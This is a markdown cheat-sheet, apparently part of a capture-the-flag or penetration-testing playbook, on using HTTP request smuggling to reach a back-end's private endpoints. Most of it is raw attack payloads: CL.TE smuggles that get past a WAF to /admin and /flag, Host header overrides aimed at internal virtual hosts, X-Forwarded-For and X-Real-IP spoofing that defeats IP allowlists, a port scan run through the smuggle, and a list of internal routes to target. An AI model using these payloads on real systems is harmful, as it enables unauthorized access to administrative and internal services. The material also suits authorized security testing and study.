# Internal routes — reaching the back-end's private endpoints

## The shape — the smuggle runs AS the back-end

The smuggled request executes on the back-end — its source is the
back-end's own socket — a `loopback-only` or `internal-only` route
that the front-end would never reach becomes reachable.

## The frontend-bypass — `GET /admin` behind a WAF

```text
GET / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

The front-end's WAF/filter blocks `GET /admin` — but the filter runs on
the FRONT-end — the smuggle bypasses it → `GET /admin` reaches the
back-end → the admin route executes.

## The internal-host header — `Host: internal`

```text
GET /admin HTTP/1.1
Host: internal:8080
```

The smuggle's `Host:` overrides the vhost — the back-end routes to
`internal:8080` — an internal virtual host the front-end wouldn't route.

## The X-Forwarded-For smuggle — `XFF: 127.0.0.1`

```text
GET /admin HTTP/1.1
Host: t
X-Forwarded-For: 127.0.0.1
```

The smuggle carries `XFF: 127.0.0.1` — the back-end reads the spoofed
source → the IP-allowlist passes → the internal route opens.

## The trusted-header smuggle — the proxy's own headers

```text
GET /admin HTTP/1.1
Host: t
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Internal-Request: true
```

The front-end INJECTS `X-Forwarded-For`/`X-Real-IP` headers on behalf
of the client — but the smuggle bypasses the injection — UNLESS the
front-end strips the client's own values — the smuggle's own `XFF`
may survive if the front-end only strips on the OUTER request.

## The admin-route checklist — what internal routes look like

- `/admin`, `/internal`, `/debug`, `/metrics`, `/actuator`
- `/flag`, `/secret`, `/private`
- loopback-only listeners — `127.0.0.1:port`
- vhost-only routes — `Host: internal`

## The readback — the smuggle's output via the NEXT response

The smuggle's response goes to the next request — read it back via the
self-poison or a stored-param — `response-poisoning.md`.

## The internal-flag route — `GET /flag` smuggle

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /flag HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

The `/flag` route — internal-only — the smuggle runs as the back-end —
the flag text in the response — verbatim excerpt — `evidence-rules.md`.

## The port-scan via smuggle — `Host: t:port`

```text
GET / HTTP/1.1
Host: internal:9000
```

Each smuggle probes an internal port — the response's difference is the
port's open-ness — a port-scan through the smuggle.

## The proxy-header-inheritance — the front's injected headers

Some front-ends inject `X-Forwarded-*`, `Via`, `X-Request-ID` on EVERY
forwarded request — including the smuggle — the smuggle inherits the
front's trust headers → the internal route trusts it.
